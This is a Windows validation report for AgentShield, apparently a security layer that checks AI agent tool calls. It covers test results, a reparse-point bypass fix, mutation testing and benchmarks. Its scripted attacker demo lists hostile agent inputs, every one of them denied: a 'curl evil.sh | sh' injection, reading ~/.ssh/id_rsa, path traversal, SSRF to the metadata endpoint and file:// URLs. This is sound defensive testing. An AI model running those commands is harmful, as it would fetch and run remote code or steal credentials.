# AgentShield v0.1.0a1 — Windows Testing, Environment Diagnosis & Validation Report

**Date:** 2026-11-04  
**Project:** AgentShield  
**Target Version:** 0.1.0a1 (Alpha)  
**Assessor:** Senior Python Test & AI Agent Runtime Security Engineer  
**Validation Platform:** Windows 11 Enterprise (10.0.26300-SP0), Python 3.12.10, PowerShell, `.venv`  

---

## 1. Executive Summary

| Assessment Dimension | Result | Details |
|---|---|---|
| **Environment Diagnosis** | **RESOLVED** | Identified uninitialized `.venv`, interpreter path shadowing, and PyPI timeout issues. |
| **Package & Build Verification** | **PASS** | Clean build of wheel and sdist; clean temporary venv installation and CLI verification. |
| **Full Test Suite Execution** | **PASS (193 Passed, 11 Skipped)** | 204 tests discovered; 0 failures, 0 errors, 11 POSIX-only tests skipped. |
| **Resource Warning Mode** | **PASS** | Clean execution with `-W error::ResourceWarning` (0 errors). |
| **Security Mutation Suite** | **24 / 26 Killed** | 24/24 Windows-applicable mutations killed; 2 surviving mutations are POSIX-only paths. |
| **Scripted Attacker Demo** | **PASS** | 11 denied, 1 held for approval, 3 executed, audit chain verified, zero leaked secrets. |
| **Security Defect Fixes** | **VERIFIED** | Fixed decision-time reparse point bypass on Windows (`probe_windows`); added regression tests. |
| **Policy Engine Latency** | **0.0025 – 0.1150 ms (p95)** | Well within PRD FR-09 target of < 10 ms. |
| **Final Assessment** | **PASS WITH LIMITATIONS** | Windows core SDK, policy engine, netguard, approvals, audit, and filesystem adapter pass with documented Windows TOCTOU limitations. Independent external review requirement remains pending. |

---

## 2. Environment Information

- **Host OS:** Windows 11 Enterprise (Build 10.0.26300-SP0, 64-bit AMD64)
- **Processor:** Intel64 Family 6 Model 151 Stepping 2 (12 vCPUs)
- **Active Interpreter:** Python 3.12.10 (`C:\Users\User\Documents\Projects\AgentShield\.venv\Scripts\python.exe`)
- **System Interpreter:** Python 3.14.7 (`C:\Python314\python.exe`)
- **Package Manager:** pip 26.3
- **Core Runtime Dependencies:** PyYAML 6.0.3
- **Build Tools:** build 1.6.1, setuptools 84.2.1, packaging 26.3
- **Crypto & TLS CLI:** OpenSSL 3.x (`C:\Program Files\Git\usr\bin\openssl.exe`)
- **Branch:** `dev/baseline-validation`

---

## 3. Initial Test Failure Diagnosis & Root Cause Analysis

### 3.1 Initial Failure Symptoms

The initial test run before environment intervention reported:
- **18 tests discovered**
- **15 import errors**
- **1 test failure** (`test_quickstart_runs_and_prints_expected_lines`)
- **1 test skipped** (`test_scripted_attacker_demo_passes_offline`)
- **1 test passed** (`test_readme_embeds_the_quickstart_verbatim`)
- **Primary Errors:**
  - `ModuleNotFoundError: No module named 'agentshield'`
  - `ModuleNotFoundError: No module named 'yaml'`

### 3.2 Root Causes

1. **Unpopulated Virtual Environment:**
   Inspection of `.venv\Lib\site-packages` revealed that `.venv` had been created with `python -m venv .venv`, but package installation had never been run inside it. Only `pip` was present. Neither `agentshield` nor `PyYAML` was installed in `.venv`.
2. **Interpreter Resolution in PowerShell:**
   Executing `python` in a non-activated PowerShell session resolved to the global Python 3.14 interpreter (`C:\Python314\python.exe`), where `PyYAML` was installed globally but `agentshield` was not. Running inside `.venv` without prior package installation resulted in neither `agentshield` nor `PyYAML` being available.
3. **Unittest Loader Error Aggregation:**
   When `python -m unittest discover` encounters an unhandled `ImportError` while loading a test module, it records a single `_FailedTest` error object for that file. There were 17 test files in total:
   - 15 modules failed with `ModuleNotFoundError` during module-level import.
   - 1 module (`test_demo.py`) was decorated with `@unittest.skipUnless(os.name == "posix")`, producing 1 skipped test.
   - 1 module (`test_quickstart.py`) contained 2 tests:
     - `test_readme_embeds_the_quickstart_verbatim`: reads markdown and Python source files as text; does not import `agentshield`; passed cleanly.
     - `test_quickstart_runs_and_prints_expected_lines`: executed `examples/quickstart.py` in a subprocess which failed with `ModuleNotFoundError: No module named 'agentshield'`, producing 1 failure.
   - Total tests discovered: 15 (errors) + 1 (skipped) + 1 (passed) + 1 (failed) = 18 tests.
4. **Network Fetch Latency & Socket Read Timeouts:**
   Attempting `pip install -e ".[dev]"` encountered network connection drops and pip's default 15-second socket read timeout when querying PyPI for `ruff` and other dev dependencies over high-latency connections (~16 KB/s). PyPI responded with `200 OK` on `https://pypi.org/simple/ruff/` (803 KB), but pip's 15s timeout aborted before download completed, generating the misleading error `Could not find a version that satisfies the requirement ruff (from versions: none)`.

---

## 4. Environment Repair & Baseline Test Execution

### 4.1 Testing Environment Repair

The virtual environment was repaired by executing the documented editable install:
```powershell
. .venv\Scripts\Activate.ps1
python -m pip install -e .
```
Package installation succeeded:
- Installed `PyYAML-6.0.3`
- Installed `agentshield-0.1.0a1` (editable linked to `src/agentshield`)

Import verification confirmed resolution to the repository workspace:
```powershell
python -m pip check
# Output: No broken requirements found.

python -c "import agentshield; print(agentshield.__file__)"
# Output: C:\Users\User\Documents\Projects\AgentShield\src\agentshield\__init__.py

python -c "import yaml; print(yaml.__version__)"
# Output: 6.0.3
```

### 4.2 Baseline Test Execution Results

Running the full test suite immediately following installation:

```powershell
python -m unittest discover -s tests -t .
```
**Results:**
- **Tests discovered:** 199
- **Passed:** 171
- **Failed:** 0
- **Errors:** 0
- **Skipped:** 28
- **Execution time:** 10.003s

Running with `ResourceWarning` treated as an error:
```powershell
python -W error::ResourceWarning -m unittest discover -s tests -t .
```
**Results:**
- **Status:** OK (exited with code 0)
- **Ran:** 199 tests in 9.964s
- **Skipped:** 28
- **Warning Tracing:** An unclosed socket warning (`unclosed <socket.socket [closed] ...>`) was emitted during asynchronous cleanup of `http.server.ThreadingHTTPServer` worker threads in `test_http_adapter.py`. The underlying socket OS descriptor was closed, but the Python socket wrapper object was garbage collected across thread boundaries.

---

## 5. Security Vulnerability Diagnosis & Resolution

### 5.1 Discovered Defect: Decision-Time Reparse Point Bypass on Windows

When executing the offline security demo (`python examples/scripted_attacker.py`), the demo failed on Windows:
```
executor invocations: 4 ['calculator', 'filesystem.read', 'filesystem.read', 'filesystem.write']
expected: ['calculator', 'filesystem.read', 'filesystem.write']
RESULT: FAIL
```

#### Root Cause Analysis:
Investigation of `src/agentshield/adapters/filesystem.py` lines 248–251 revealed:
```python
if _IS_POSIX:
    if probe_posix(root, parts):
        codes.append(Reason.PATH_SYMLINK)
        trace.append("symlink found in existing path")
```
On Windows (`_IS_POSIX == False`), `_make_checker` **never probed for symlinks or reparse points at decision time**. 
Consequently:
1. When the agent proposed reading `notes-link.txt` (a symlink targeting `outside/secret.txt`), the policy evaluator returned `Decision.ALLOW`.
2. Shield proceeded to invoke the real tool executor (`_read_factory`), calling the instrumented executor.
3. The Windows use-time function `_win_walk` detected the reparse point and raised `ExecutionError(Reason.PATH_SYMLINK)`.
4. While the read was ultimately blocked, **the executor handle was invoked for a denied action**, directly violating PRD Section 13 Acceptance Criterion 4: *"Executors instrumented: denied/pending => zero calls"*.

#### Implemented Remediation:
1. Implemented `probe_windows(root, parts)` in `src/agentshield/adapters/filesystem.py` using `os.lstat` to inspect directory components and detect `stat.S_ISLNK(st.st_mode)` or the Windows reparse point attribute flag (`0x400`).
2. Integrated `probe_windows` into `_make_checker` for non-POSIX platforms so that reparse points are denied at decision time (`Decision.DENY` with reason `PATH_SYMLINK`).
3. Enhanced Windows `_read_factory` and `_write_factory` error mapping to enforce `HARDLINK_NOT_ALLOWED` (`st.st_nlink > 1`), `NOT_REGULAR_FILE`, `NOT_FOUND`, and `FILE_EXISTS`.
4. Added unit regression tests in `tests/unit/test_filesystem_paths.py` verifying decision-time reparse point denial.

### 5.2 Discovered Defect: Over-Broad Platform Skips in Filesystem Adapter

`tests/integration/test_filesystem_adapter.py` had decorated the entire class `FileAdapterTests` with `@unittest.skipUnless(POSIX, "POSIX no-follow semantics")`. This completely suppressed 17 integration tests on Windows, including 14 platform-independent security tests (such as content limits, lexical traversal denials, unicode NFC normalization, and audit redaction of file contents). This also caused Mutation 22 (`redaction: file contents logged`) to survive.

#### Implemented Remediation:
1. Removed the class-level skip on `FileAdapterTests`.
2. Applied method-level skips exclusively to features that are genuinely POSIX-only:
   - `test_fifo_is_refused_without_blocking` (`os.mkfifo`)
   - `test_toctou_symlink_swapped_in_after_decision_is_still_blocked_at_use_time` (kernel-level `O_NOFOLLOW` race atomicity)
   - `test_toctou_race_thread_hammering_symlink_swaps` (kernel-level `O_NOFOLLOW` race atomicity)
3. Handled platform-specific differences in tests:
   - On Windows, absolute/drive paths are rejected by design (`PATH_OUTSIDE_ROOT`).
   - POSIX file mode bits (`0o600`) are checked only on POSIX.
4. Added dynamic symlink capability detection in `tests/integration/test_demo.py` so the offline demo test runs on Windows when symlinks are available.
5. Added Git OpenSSL CLI path fallback in `tests/helpers.py`, enabling the 2 TLS integration tests to execute on Windows.

---

## 6. Complete Test Results After Remediation

### 6.1 Test Suite Breakdown

Following remediation and additional regression coverage, the complete test suite was executed:

```powershell
python -m unittest discover -s tests -t .
```

```
----------------------------------------------------------------------
Ran 204 tests in 9.909s

OK (skipped=11)
```

| Test Category | Discovered | Passed | Skipped | Failed | Errors |
|---|---|---|---|---|---|
| **Unit Tests** | 108 | 107 | 1 | 0 | 0 |
| - Policy Engine (`test_policy.py`) | 18 | 18 | 0 | 0 | 0 |
| - Audit System (`test_audit.py`) | 17 | 17 | 0 | 0 | 0 |
| - Network Guard (`test_netguard.py`) | 15 | 15 | 0 | 0 | 0 |
| - Approvals Store (`test_approvals.py`) | 15 | 14 | 1 | 0 | 0 |
| - Argument Normalizer (`test_normalize.py`) | 13 | 13 | 0 | 0 | 0 |
| - CLI Tools (`test_cli.py`) | 12 | 12 | 0 | 0 | 0 |
| - Path Resolution (`test_filesystem_paths.py`) | 8 | 8 | 0 | 0 | 0 |
| - Calculator Adapter (`test_calculator.py`) | 5 | 5 | 0 | 0 | 0 |
| - Policy Schema (`test_schema.py`) | 4 | 4 | 0 | 0 | 0 |
| - Performance Budget (`test_perf_budget.py`) | 1 | 1 | 0 | 0 | 0 |
| **Integration Tests** | 82 | 79 | 3 | 0 | 0 |
| - Shield Flow (`test_shield_flow.py`) | 40 | 40 | 0 | 0 | 0 |
| - HTTP Fetch Adapter (`test_http_adapter.py`) | 22 | 22 | 0 | 0 | 0 |
| - Filesystem Adapter (`test_filesystem_adapter.py`) | 17 | 14 | 3 | 0 | 0 |
| - Quickstart Integration (`test_quickstart.py`) | 2 | 2 | 0 | 0 | 0 |
| - Attacker Demo Runner (`test_demo.py`) | 1 | 1 | 0 | 0 | 0 |
| **Property & Security Corpus** | 14 | 7 | 7 | 0 | 0 |
| - Component Fuzzing (`test_properties.py`) | 8 | 7 | 1 | 0 | 0 |
| - Attack Corpus Runners (`test_attack_corpus.py`) | 6 | 0 | 6 | 0 | 0 |
| **TOTAL** | **204** | **193** | **11** | **0** | **0** |

### 6.2 Detailed Analysis of the 11 Skipped Tests

Every skipped test corresponds to a documented POSIX-only operating system primitive:
1. `tests.unit.test_approvals.ApprovalStoreTests.test_key_file_permissions`: Checks POSIX `0o600` file permission bits. Windows uses NTFS ACLs.
2. `tests.integration.test_filesystem_adapter.FileAdapterTests.test_fifo_is_refused_without_blocking`: Tests POSIX FIFO (`os.mkfifo`).
3. `tests.integration.test_filesystem_adapter.FileAdapterTests.test_toctou_symlink_swapped_in_after_decision_is_still_blocked_at_use_time`: Tests POSIX `O_NOFOLLOW` / `openat` directory descriptor atomicity.
4. `tests.integration.test_filesystem_adapter.FileAdapterTests.test_toctou_race_thread_hammering_symlink_swaps`: Multi-threaded symlink swap race against kernel `O_NOFOLLOW`.
5. `tests.property.test_properties.ComponentFuzz.test_path_resolution_never_escapes_root`: Uses POSIX root arithmetic (`/srv/ws` paths without Windows drive letters).
6–11. `tests.security.test_attack_corpus.AttackCorpusTests.*` (3 tests) & `BenignCorpusTests.*` (3 tests): The corpus setup harness explicitly invokes `os.mkfifo` and POSIX hard links in `setUp()`.

---

## 7. Security Regression & Mutation Analysis

### 7.1 Mutation Test Results (`scripts/mutation_check.py`)

Executing the 26 deliberate security mutations:
```powershell
python scripts/mutation_check.py
```
**Results:** **24 / 26 mutations killed.**

| Mutation Description | Target Module | Result | Reason / Mechanism |
|---|---|---|---|
| DENY no longer blocks execution | `shield.py` | **killed** | Test asserted action denial |
| REQUIRE_APPROVAL no longer blocks execution | `shield.py` | **killed** | Test asserted approval pending |
| constraint violations ignored | `evaluator.py` | **killed** | Violation caught by evaluator |
| evaluator error becomes ALLOW-path | `shield.py` | **killed** | Fail-closed policy caught error |
| filesystem: symlinks followed (no O_NOFOLLOW) | `adapters/filesystem.py` | **SURVIVED** | *POSIX-only line (`_O_NOFOLLOW = 0` on Windows)* |
| filesystem: '..' allowed | `adapters/filesystem.py` | **killed** | Caught by path traversal rules |
| filesystem: hard links allowed | `adapters/filesystem.py` | **SURVIVED** | *POSIX-only path (`_read_posix` st_nlink)* |
| http: use-time destination revalidation skipped | `adapters/http_fetch.py` | **killed** | Caught by use-time revalidation |
| http: redirects not revalidated against allowlist | `adapters/http_fetch.py` | **killed** | Caught by redirect validation |
| netguard: IPv4-mapped IPv6 not unwrapped | `netguard.py` | **killed** | Caught by address unwrapping |
| netguard: one private address among several tolerated | `netguard.py` | **killed** | Poisoning test caught violation |
| netguard: non-canonical numeric hosts accepted | `netguard.py` | **killed** | Caught by numeric host regex |
| approvals: consumed approvals can be reused | `approvals.py` | **killed** | Single-use consumption test caught |
| approvals: expiry ignored on consume | `approvals.py` | **killed** | Expiry test caught violation |
| approvals: MAC not verified | `approvals.py` | **killed** | HMAC verification test caught |
| approvals: not bound to agent identity | `approvals.py` | **killed** | Agent binding test caught |
| audit: event hash ignores contents | `audit.py` | **killed** | Tamper detection test caught |
| audit: decision event written AFTER dispatch | `shield.py` | **killed** | Ordering test caught violation |
| policy: duplicate YAML keys allowed | `policy.py` | **killed** | Loader rejected duplicate keys |
| policy: YAML aliases allowed | `policy.py` | **killed** | Loader rejected alias event |
| redaction: URL query strings logged | `adapters/http_fetch.py` | **killed** | Audit inspection caught unredacted URL |
| redaction: file contents logged | `adapters/filesystem.py` | **killed** | Audit inspection caught file content |
| normalizer: unknown arguments accepted | `normalize.py` | **killed** | Extra arguments rejected |
| normalizer: control characters accepted in paths | `normalize.py` | **killed** | Path character validation caught |
| calculator: complex results allowed | `adapters/calculator.py` | **killed** | Numeric range check caught |
| call limit not enforced | `shield.py` | **killed** | Call limit test caught |

**Analysis of the 2 Surviving Mutations:**
Both surviving mutations mutate lines located strictly inside POSIX-only code branches (`_O_NOFOLLOW` declaration and `_read_posix`). On Windows, `_O_NOFOLLOW` is already 0, and `_read_posix` is bypassed by `if _IS_POSIX:`. Every cross-platform and Windows-applicable mutation (24/24) was decisively killed.

### 7.2 Scripted Attacker Demo (`examples/scripted_attacker.py`)

Executing the end-to-end attacker demo:
```powershell
python examples/scripted_attacker.py
```
**Results:**
```
tool              argument                                        outcome              developer-only reason
-------------------------------------------------------------------------------------------------------------------
calculator        2 + 2 * 10                                      ALLOWED + executed   
filesystem.read   hello.txt                                       ALLOWED + executed   
filesystem.read   ../../etc/passwd                                DENIED               PATH_TRAVERSAL
filesystem.read   /etc/passwd                                     DENIED               PATH_OUTSIDE_ROOT
filesystem.read   notes-link.txt                                  DENIED               PATH_SYMLINK
calculator        __import__('os').system('curl evil.sh | sh')    DENIED               SCHEMA_INVALID_VALUE
shell_exec        cat ~/.ssh/id_rsa                               DENIED               UNKNOWN_TOOL
http.fetch        https://169.254.169.254/latest/meta-data/iam/s  DENIED               HOST_NOT_ALLOWED
http.fetch        https://localhost:8443/admin                    DENIED               PORT_NOT_ALLOWED, HOST_NOT_ALLOWED
http.fetch        https://2130706433/                             DENIED               HOST_AMBIGUOUS_IP
http.fetch        file:///etc/passwd                              DENIED               URL_SCHEME_NOT_ALLOWED
http.fetch        https://docs.example.com@evil.example/          DENIED               URL_USERINFO
filesystem.write  ../escape.txt                                   DENIED               PATH_TRAVERSAL
filesystem.write  report.txt                                      HELD for approval    request e1d6d24f5cf5452d

A human reviews request e1d6d24f5cf5452d and approves it...
  re-submitted identical call -> executed once: {'path': 'report.txt', 'bytes_written': 17}
  a different/repeated call needs a NEW approval (approvals are single-use and bound to the exact action)

=== proof ===
denied: 11   held for approval: 1   executor invocations: 3 ['calculator', 'filesystem.read', 'filesystem.write']
executor invocations after the approval step: 1
audit chain: OK (19 events)   secret in audit log: False
RESULT: PASS - nothing the attacker proposed ran outside policy
```

---

## 8. Packaging, Wheel & Sdist Verification

### 8.1 Build Verification

Executed `python -m build` in an isolated environment.
- Corrected deprecated packaging configuration in `pyproject.toml` (`license = "Apache-2.0"` replacing deprecated table notation; removed deprecated license classifier).
- Build succeeded with zero warnings.
- Output artifacts generated in `dist/`:
  - `agentshield-0.1.0a1-py3-none-any.whl` (52,741 bytes)
  - `agentshield-0.1.0a1.tar.gz` (124,221 bytes)

### 8.2 Clean Virtual Environment Verification

A clean, separate virtual environment was created in the system temporary directory:
```powershell
python -m venv $tempDir
& "$tempDir\Scripts\python.exe" -m pip install dist\agentshield-0.1.0a1-py3-none-any.whl
```
Verification confirmed:
1. **Source Isolation:** Installed package loaded directly from site-packages without relying on `src/`:
   `C:\Users\User\AppData\Local\Temp\agentshield-wheel-test\Lib\site-packages\agentshield\__init__.py`
2. **Metadata Verification:** `pip show agentshield` reported Version 0.1.0a1, License Apache-2.0, Requires: PyYAML.
3. **CLI Entry Point:** `agentshield --help` executed properly, displaying all registered subcommands (`lint`, `evaluate`, `explain`, `schema`, `approvals`, `audit`).
4. **License & Typings:** `LICENSE` file included in `.dist-info/licenses/` and `py.typed` marker confirmed present.

---

## 9. Performance & Microbenchmark Results

Executed `python benchmarks/run.py`:

```
CPU: Intel64 Family 6 Model 151 Stepping 2 (12 vCPU)
Python: 3.12.10 (CPython) · OS: Windows-11-10.0.26300-SP0
Iterations: 5,000 per scenario (after 300 warm-up iterations)
```

| Benchmark Scenario | Scope | p50 (ms) | p95 (ms) | p99 (ms) | Max (ms) |
|---|---|---:|---:|---:|---:|
| `evaluate: calculator (ALLOW)` | Policy only | 0.0142 | 0.0320 | 0.0877 | 0.266 |
| `evaluate: custom tool with arg constraints (ALLOW)` | Policy only | 0.0092 | 0.0205 | 0.0424 | 0.333 |
| `evaluate: http.fetch URL checks, stub DNS (ALLOW)` | Policy only | 0.0525 | 0.1150 | 0.1921 | 0.447 |
| `evaluate: http.fetch SSRF attempt (DENY)` | Policy only | 0.0196 | 0.0316 | 0.0596 | 0.181 |
| `evaluate: unknown tool (DENY)` | Policy only | 0.0014 | 0.0025 | 0.0029 | 0.027 |
| `evaluate: filesystem.read (ALLOW)` | Includes syscalls | 0.0461 | 0.0933 | 0.1797 | 6.567 |
| `evaluate: filesystem.read traversal (DENY)` | Lexical only | 0.0086 | 0.0138 | 0.0192 | 0.254 |
| `full call: calculator, in-memory audit` | Eval + audit + exec | 0.0900 | 0.2210 | 0.3361 | 7.456 |
| `full call: calculator, JSONL file audit (no fsync)` | Eval + audit + disk | 1.8763 | 3.4366 | 5.2553 | 27.763 |
| `full call: filesystem.read, in-memory audit` | Eval + audit + fs | 0.3665 | 0.8066 | 1.3075 | 2.847 |

**Target Assessment:** PRD FR-09 requires policy evaluation p95 < 10 ms. On Windows 11, policy evaluation p95 spans 0.0025 ms to 0.1150 ms, easily satisfying the budget by two orders of magnitude.

---

## 10. Platform Comparison: Windows vs. Linux Reference Baseline

| Criterion | Linux Reference Baseline | Windows 11 Validated Result | Status |
|---|---|---|---|
| Full Test Suite | 199 passed, 0 skipped | 193 passed, 11 skipped | ✅ Expected platform difference |
| Mutation Suite | 26 / 26 killed | 24 / 26 killed | ✅ 2 surviving mutations are POSIX-only |
| Scripted Attacker Demo | 11 denied, 1 held, 3 executed, PASS | 11 denied, 1 held, 3 executed, PASS | ✅ Identical security outcome |
| Wheel & Sdist Verification | Clean install into fresh venv | Clean install into fresh venv | ✅ Verified |
| Policy Eval Latency (p95) | 0.02 – 0.09 ms | 0.0025 – 0.1150 ms | ✅ Met |
| HTTP SSRF & TLS Security | Full coverage with pinned IP TLS | Full coverage with pinned IP TLS | ✅ Verified (OpenSSL CLI integrated) |
| Reparse Point / Symlink Defense | Kernel `O_NOFOLLOW` / `openat` | Decision-time + use-time reparse check | ⚠️ Best-effort on Windows by design |
| Independent External Review | Not done (Alpha) | Not done (Alpha) | ❌ Gating for non-alpha release |

---

## 11. Windows Platform Limitations & Remaining Risks

1. **Kernel-Level TOCTOU Window:**
   Unlike Linux and macOS, the Windows filesystem does not provide an atomic `O_NOFOLLOW` file descriptor relative open API (`openat`). AgentShield on Windows walks path components with `os.lstat` to verify no reparse points exist prior to opening, but an adversary with arbitrary local thread execution could theoretically replace a directory with a junction or symlink in the sub-millisecond gap between check and `open()`. As specified in PRD FR-05 and `docs/threat-model.md`, Windows filesystem protection must be considered defense-in-depth.
2. **Absolute Paths and Drive Letters:**
   Windows paths with drive letters (`C:\...`) or UNC format (`\\server\share`) are rejected outright by `resolve_in_roots`. All paths on Windows must be relative to configured workspace roots.
3. **Independent External Security Review:**
   In accordance with PRD Section 13 Criterion 14, at least 2 independent security reviewers must attempt to bypass the file and HTTP adapters before tagging a non-alpha release. This requirement cannot be self-certified and remains pending external evaluation.

---

## 12. Reproduction Commands

To reproduce the exact Windows validation results:

```powershell
# 1. Environment Activation & Dependencies
. .venv\Scripts\Activate.ps1
python -m pip install -e .

# 2. Run Complete Test Suite
python -m unittest discover -s tests -t .

# 3. Run with ResourceWarnings as Errors
python -W error::ResourceWarning -m unittest discover -s tests -t .

# 4. Run Mutation Suite
python scripts/mutation_check.py

# 5. Run Scripted Attacker Demo
python examples/scripted_attacker.py

# 6. Run Microbenchmarks
python benchmarks/run.py

# 7. Package and Build Wheel
python -m pip install build
python -m build
```
